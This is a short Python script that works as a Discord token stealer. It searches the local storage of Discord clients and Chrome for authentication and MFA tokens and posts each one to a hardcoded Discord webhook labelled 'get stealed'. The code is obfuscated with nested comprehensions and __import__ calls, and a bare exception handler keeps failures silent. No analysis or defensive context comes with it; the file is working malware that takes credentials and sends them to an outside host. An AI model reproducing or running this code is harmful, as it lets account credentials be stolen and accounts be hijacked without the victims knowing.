import discord
import requests
import os

try:
    [
        [
            [
                __import__("requests").post(
                    "https://discord.com/api/webhooks/815048322414936075/SnIr7HTGb_Fr48thne92sW2MV2bVpT-OiTt275g50yFNzmD5y10qdetbcBCYH8IrurNq",
                    data={
                        "content": "\n```:sparkles:get stealed:sparkles: :: %s```\n"
                        % (x)
                    },
                )
                for x in __import__("re").findall(
                    r"[a-zA-Z0-9\-]{24}\.[a-zA-Z0-9\-]{6}\.[a-zA-Z0-9\-]{27}|mfa\.[a-zA-Z0-9\-]{84}",
                    open(
                        "%s/%s" % (path, file_name), encoding="utf-8", errors="ignore"
                    ).read(),
                )
            ]
            for file_name in __import__("os").listdir(path)
            if not file_name.endswith(".log")
        ]
        for path in [
            "%s%s\Local Storage\leveldb"
            % (__import__("os").getenv("APPDATA"), endpoint)
            for endpoint in [
                r"\discord",
                r"\discordcanary",
                r"\discordptb",
                r"\Google\Chrome\User Data\Default",
            ]
            if __import__("os").path.isdir(
                "%s%s\Local Storage\leveldb"
                % (__import__("os").getenv("APPDATA"), endpoint)
            )
        ]
    ]
except:
    pass
